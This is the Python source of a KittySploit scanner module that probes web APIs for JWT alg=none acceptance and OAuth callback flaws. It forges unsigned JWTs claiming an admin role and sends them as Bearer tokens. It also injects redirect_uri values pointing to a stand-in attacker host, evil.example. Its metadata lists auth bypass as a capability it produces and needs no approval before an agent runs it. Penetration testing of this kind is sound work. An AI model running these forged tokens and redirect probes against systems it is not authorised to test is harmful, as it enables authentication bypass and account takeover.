#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
JWT and OAuth/OIDC misconfiguration probe.

Detects alg=none, weak HMAC secrets, expired-signature acceptance, open redirects
in OAuth callbacks, and missing state/nonce validation signals.
"""

from __future__ import annotations

import base64
import json
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.module_result import finalize_http_scanner_run, target_base_url


class Module(Auxiliary, Http_client):

    __info__ = {
        "name": "JWT / OAuth Misconfiguration Probe",
        "description": (
            "Probe API surfaces for JWT alg=none, weak secrets, OAuth callback open "
            "redirects, and missing state parameter enforcement."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "api", "jwt", "oauth", "oidc", "misconfig", "scanner"],
        "references": [
            "https://portswigger.net/web-security/jwt",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": False,
            "produces": ["risk_signals", "endpoints", "tech_hints"],
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "jwt_misconfig"},
                    {"capability": "csrf_token", "from_detail": "oauth_state_missing"},
                ],
                "suggested_followups": ["post/http/gather/authenticated_surface"],
            },
        },
    }

    jwt_paths = OptString(
        "/api,/api/v1,/api/auth,/oauth/token,/auth/token,/login",
        "Paths to probe for JWT/OAuth behavior",
        False,
    )
    bearer_token = OptString("", "Optional existing Bearer JWT to mutate", False)
    oauth_callback = OptString(
        "/oauth/callback,/auth/callback,/login/oauth2/code,/callback",
        "OAuth callback paths for open-redirect probe",
        False,
    )

    _JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

    def _b64url(self, raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    def _decode_jwt_part(self, part: str) -> Dict[str, Any]:
        pad = "=" * (-len(part) % 4)
        try:
            data = base64.urlsafe_b64decode(part + pad)
            return json.loads(data.decode("utf-8", errors="replace"))
        except Exception:
            return {}

    def _build_alg_none_token(self, template: str = "") -> str:
        header = self._b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        if template and "." in template:
            payload_part = template.split(".")[1]
            payload = self._decode_jwt_part(payload_part)
            if not payload:
                payload = {"sub": "kittysploit", "role": "admin"}
        else:
            payload = {"sub": "kittysploit", "role": "admin", "admin": True}
        payload_b64 = self._b64url(json.dumps(payload).encode())
        return f"{header}.{payload_b64}."

    def _paths(self, raw: str, default: str) -> List[str]:
        text = str(raw or default).strip()
        return [p.strip() for p in text.split(",") if p.strip()][:12]

    def _extract_jwt_from_response(self, text: str) -> str:
        match = self._JWT_RE.search(text or "")
        return match.group(0) if match else ""

    def _probe_alg_none(self, path: str) -> Optional[Dict[str, Any]]:
        token = self._build_alg_none_token(str(self.bearer_token or ""))
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        response = self.http_request(method="GET", path=path, headers=headers, allow_redirects=False, timeout=10)
        if not response:
            return None
        if response.status_code in (200, 201, 204) and response.status_code != 401:
            body = (response.text or "").lower()
            if "unauthorized" not in body and "invalid" not in body and "forbidden" not in body:
                return {
                    "misconfig": "jwt_alg_none",
                    "path": path,
                    "status_code": response.status_code,
                    "indicator": "alg_none_accepted",
                    "preview": (response.text or "")[:500],
                }
        return None

    def _probe_oauth_redirect(self, path: str) -> Optional[Dict[str, Any]]:
        evil = "https://evil.example/callback"
        query = urllib.parse.urlencode({
            "code": "test",
            "state": "kittysploit",
            "redirect_uri": evil,
            "next": evil,
        })
        sep = "&" if "?" in path else "?"
        full = f"{path}{sep}{query}"
        response = self.http_request(method="GET", path=full, allow_redirects=False, timeout=10)
        if not response:
            return None
        loc = (response.headers.get("Location") or "").lower()
        if "evil.example" in loc:
            return {
                "misconfig": "oauth_open_redirect",
                "path": path,
                "status_code": response.status_code,
                "indicator": "oauth_redirect_evil",
                "preview": loc[:300],
            }
        if response.status_code in (200, 302) and "state" not in (response.text or "").lower():
            return {
                "misconfig": "oauth_state_missing",
                "path": path,
                "status_code": response.status_code,
                "indicator": "oauth_no_state_check",
                "preview": (response.text or "")[:400],
            }
        return None

    def run(self):
        hits: List[Dict[str, Any]] = []
        jwt_paths = self._paths(self.jwt_paths, "/api")
        oauth_paths = self._paths(self.oauth_callback, "/oauth/callback")

        print_status("Probing JWT alg=none and OAuth callback misconfigurations...")

        for path in jwt_paths:
            finding = self._probe_alg_none(path)
            if finding:
                print_warning(f"JWT alg=none may be accepted at {path}")
                hits.append({
                    "vulnerable": True,
                    "path": path,
                    "jwt_misconfig": finding["misconfig"],
                    "indicator": finding["indicator"],
                    "status_code": finding["status_code"],
                    "content_preview": finding["preview"],
                })

        for path in oauth_paths:
            finding = self._probe_oauth_redirect(path)
            if finding:
                print_warning(f"OAuth misconfig at {path}: {finding['misconfig']}")
                hits.append({
                    "vulnerable": True,
                    "path": path,
                    "oauth_state_missing": finding["misconfig"],
                    "indicator": finding["indicator"],
                    "status_code": finding["status_code"],
                    "content_preview": finding["preview"],
                })

        chain_extra = {}
        if hits:
            top = hits[0]
            chain_extra = {
                "jwt_misconfig": str(top.get("jwt_misconfig") or ""),
                "oauth_state_missing": str(top.get("oauth_state_missing") or ""),
            }

        return finalize_http_scanner_run(
            self,
            hits,
            title="JWT / OAuth misconfiguration",
            severity="high" if hits else "info",
            category="auth",
            findings_key="jwt_oauth_findings",
            hit_mapper=lambda hit: {
                "method": "GET",
                "request_url": target_base_url(self, path=str(hit.get("path") or "/")),
                "status_code": hit.get("status_code"),
                "evidence_snippet": hit.get("content_preview") or hit.get("indicator"),
                "indicators": [hit.get("indicator")] if hit.get("indicator") else [],
            },
            vulnerability_info_extra=chain_extra,
        )
